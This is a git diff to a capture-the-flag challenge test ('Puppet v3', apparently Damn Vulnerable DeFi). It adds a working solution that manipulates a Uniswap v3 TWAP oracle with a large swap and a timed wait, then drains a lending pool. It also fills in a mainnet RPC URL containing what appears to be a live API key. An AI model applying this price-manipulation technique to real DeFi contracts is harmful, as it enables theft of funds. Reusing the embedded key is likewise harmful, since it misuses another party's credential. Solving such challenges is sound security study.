@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth-mainnet.g.alchemy.com/v2/PeCaD7LtAC-Blw3_DMxuFmL3A30rV5Nj";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -139,7 +139,26 @@ describe('[Challenge] Puppet v3', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // The oracle that lendingPool calls uses the arithemeticMean of ticks, but ticks are defined in logarithm scale: 1.0001**ticks = price.
+        // So we can simply write a contract to swap our dvt tokens, wait 105 seconds, then the reflected price in the oracle will decrease.
+
+        // 1. Deploy attack contract and swap dvt token for weth in uniswap v3.
+        attack = await (await ethers.getContractFactory('PuppetV3PoolAttacker', player)).deploy(
+            token.address,
+            lendingPool.address,
+            uniswapPool.address
+        );
+        await token.connect(player).transfer(attack.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await attack.attack();
+
+        // 2. Wait for 105 seconds.
+        await time.increase(105); // 105 seconds
+
+        // 3. Borrow all dvt tokens in lendingPool as the oracle price is very low.
+        const wethRequired = BigInt(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
+        await weth.connect(player).deposit({value: wethRequired});
+        await weth.connect(player).approve(lendingPool.address, wethRequired)
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
@@ -150,7 +169,7 @@ describe('[Challenge] Puppet v3', function () {
             (await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp
         ).to.be.lt(115, 'Too much time passed');
 
-        // Player has taken all tokens out of the pool        
+        // Player has taken all tokens out of the pool
         expect(
             await token.balanceOf(lendingPool.address)
         ).to.be.eq(0);
